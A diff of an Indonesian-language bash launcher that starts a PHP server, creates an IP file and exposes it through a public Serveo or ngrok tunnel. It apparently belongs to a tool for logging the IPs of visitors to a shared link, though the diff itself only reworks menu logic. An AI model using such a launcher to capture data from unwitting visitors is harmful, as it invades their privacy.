@@ -61,7 +61,7 @@ start_ngrok() {
     command -v ngrok >/dev/null 2>&1 || { echo "[!] Ngrok belum terinstall!"; exit 1; }
     echo "[*] Memulai Ngrok (tunnel)..."
     ./ngrok http 3333 >/dev/null 2>&1 &
-
+    
     echo "[*] Menunggu Ngrok URL..."
     while true; do
         link=$(curl --silent http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"[^"]*' | cut -d'"' -f4)
@@ -75,7 +75,6 @@ start_ngrok() {
 
 select_tunnel() {
     while true; do
-        echo ""
         echo "----- Pilih Tunnel -----"
         echo "[1] Serveo.net"
         echo "[2] Ngrok"
@@ -85,45 +84,17 @@ select_tunnel() {
 
         case "$option" in
             1)
-                start_serveo
                 break
                 ;;
             2)
-                start_ngrok
                 break
                 ;;
             0)
                 echo "⬅ Kembali ke menu utama..."
-                return 1  # Kembali ke menu utama
-                ;;
-            *)
-                echo "[!] Pilihan tidak valid."
-                ;;
-        esac
-    done
-    return 0
-}
-
-menu_utama() {
-    while true; do
-        banner
-        dependencies
-        create_ip_file
-        start_php
-
-        echo ""
-        echo "===== MENU UTAMA ====="
-        echo "[1] Pilih Tunnel"
-        echo "[0] Keluar"
-        read -p "Pilih: " pilihan
-
-        case "$pilihan" in
-            1)
-                select_tunnel
-                ;;
-            0)
-                echo "👋 Keluar. Terima kasih!"
-                stop
+                sleep 1
+                cd ..
+                bash run.sh
+                exit 0
                 ;;
             *)
                 echo "[!] Pilihan tidak valid."
@@ -132,5 +103,18 @@ menu_utama() {
     done
 }
 
-# Jalankan program
-menu_utama
+# Main
+banner
+dependencies
+create_ip_file
+start_php
+select_tunnel
+
+if [[ $option -eq 1 ]]; then
+    start_serveo
+elif [[ $option -eq 2 ]]; then
+    start_ngrok
+else
+    echo "[!] Pilihan tidak valid. Menggunakan Serveo default."
+    start_serveo
+fi
